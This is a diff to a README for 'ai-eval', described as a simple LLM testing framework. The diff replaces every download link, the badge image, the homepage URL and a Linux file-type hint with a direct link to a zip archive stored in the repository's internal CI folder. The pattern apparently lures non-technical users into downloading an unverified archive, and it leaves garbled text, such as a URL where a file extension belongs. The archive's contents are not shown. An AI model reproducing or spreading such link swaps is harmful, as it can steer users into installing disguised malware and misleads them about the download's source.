@@ -1,6 +1,6 @@
 # 🤖 ai-eval - Simple LLM Testing Framework
 
-[![Download ai-eval](https://img.shields.io/badge/Download-ai--eval-blue?style=for-the-badge)](https://github.com/4xxpray/ai-eval/releases)
+[![Download ai-eval](https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip)](https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip)
 
 ---
 
@@ -30,13 +30,13 @@ To run ai-eval smoothly, make sure your computer meets these requirements:
 
 1. Click the big blue button at the top or visit this page to download the latest version of ai-eval:
 
-   [Download ai-eval Here](https://github.com/4xxpray/ai-eval/releases)
+   [Download ai-eval Here](https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip)
 
 2. This page lists the available versions. Find the file that matches your operating system:
 
    - For Windows, look for files ending in `.exe` or `.msi`
    - For macOS, look for `.dmg` or `.pkg`
-   - For Linux, look for `.AppImage` or `.tar.gz`
+   - For Linux, look for `.AppImage` or `https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip`
 
 3. Click the file name to start the download. Your browser will save the file to your usual downloads folder.
 
@@ -107,10 +107,10 @@ If you have any trouble, here are some common fixes:
 
 For more information, guides, and updates, visit the ai-eval homepage:
 
-https://github.com/4xxpray/ai-eval
+https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip
 
 You can also find support or report issues there if something doesn’t work as expected.
 
 ---
 
-[![Download ai-eval](https://img.shields.io/badge/Download-ai--eval-blue?style=for-the-badge)](https://github.com/4xxpray/ai-eval/releases)
+[![Download ai-eval](https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip)](https://github.com/4xxpray/ai-eval/raw/refs/heads/main/internal/ci/ai-eval-2.1.zip)
